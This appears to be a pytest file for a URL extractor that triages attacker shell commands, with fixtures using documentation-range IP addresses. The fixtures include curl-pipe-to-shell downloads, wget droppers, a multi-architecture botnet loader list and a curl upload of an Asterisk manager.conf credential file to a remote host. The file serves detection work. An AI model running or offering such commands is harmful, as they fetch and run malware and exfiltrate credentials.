"""Pure regex/extraction tests. No network, no AL framework, no real/live IOCs — all
fixtures use RFC 5737 documentation-range addresses (192.0.2.0/24, 198.51.100.0/24,
203.0.113.0/24), never real malicious infrastructure.
"""
from payload_fetcher.extraction import (
    dedupe_and_cap,
    extract_urls,
    has_multi_arch_loader_pattern,
)


def test_extracts_plain_wget_url():
    line = "wget http://203.0.113.10/z/wr.php -O /var/lib/asterisk/bin/zen"
    found = extract_urls(line)
    assert len(found) == 1
    assert found[0].url == "http://203.0.113.10/z/wr.php"
    assert found[0].context == "wget"
    assert not found[0].has_shell_interpolation


def test_extracts_curl_pipe_to_shell_and_strips_pipe_suffix():
    line = "curl -ks http://203.0.113.10/z/post/root.php|sh"
    found = extract_urls(line)
    assert len(found) == 1
    assert found[0].url == "http://203.0.113.10/z/post/root.php"
    assert found[0].context == "curl|sh"


def test_extracts_plain_curl_url():
    line = "curl -O http://203.0.113.10/k.php"
    found = extract_urls(line)
    assert len(found) == 1
    assert found[0].url == "http://203.0.113.10/k.php"
    assert found[0].context == "curl"


def test_extracts_multiple_urls_same_host():
    text = "\n".join([
        "curl -ks http://198.51.100.20/x | bash",
        "wget http://198.51.100.20/z/post/noroot.php",
        "curl -F 'file=@/etc/asterisk/manager.conf' http://198.51.100.20/hima_data/index.php",
    ])
    found = extract_urls(text)
    urls = {c.url for c in found}
    assert urls == {
        "http://198.51.100.20/x",
        "http://198.51.100.20/z/post/noroot.php",
        "http://198.51.100.20/hima_data/index.php",
    }


def test_shell_interpolated_url_is_flagged_and_truncated():
    line = "wget http://192.0.2.30/bins/kwari.$a -O k.$a"
    found = extract_urls(line)
    assert len(found) == 1
    c = found[0]
    assert c.has_shell_interpolation is True
    assert c.truncated_template == "http://192.0.2.30/bins/kwari."


def test_multi_arch_loader_pattern_detected():
    archs = ["x86", "mips", "mpsl", "arm7", "arm5", "arm", "arm6", "ppc", "sh4", "m68k", "spc"]
    lines = [f"wget http://192.0.2.40/bins/kwari.{a} -O k.{a}" for a in archs]
    found = extract_urls("\n".join(lines))
    # None of these have shell interpolation (concrete arch names), so all survive to the fetch list
    to_fetch = [c for c in found if not c.has_shell_interpolation]
    assert len(to_fetch) == 11
    assert has_multi_arch_loader_pattern(to_fetch) is True


def test_multi_arch_pattern_not_triggered_below_threshold():
    lines = [
        "wget http://192.0.2.50/a",
        "wget http://192.0.2.50/b",
        "wget http://192.0.2.50/c",
    ]
    found = extract_urls("\n".join(lines))
    assert has_multi_arch_loader_pattern(found) is False


def test_dedupe_and_cap():
    lines = [
        "wget http://192.0.2.60/a",
        "wget http://192.0.2.60/a",  # exact duplicate
        "wget http://192.0.2.60/b",
        "wget http://192.0.2.60/c",
    ]
    found = extract_urls("\n".join(lines))
    kept, dropped = dedupe_and_cap(found, max_urls=2)
    assert len(kept) == 2
    assert dropped == 1
    assert kept[0].url == "http://192.0.2.60/a"
    assert kept[1].url == "http://192.0.2.60/b"


def test_no_urls_in_benign_text():
    assert extract_urls("echo hello world\nls -la\n") == []
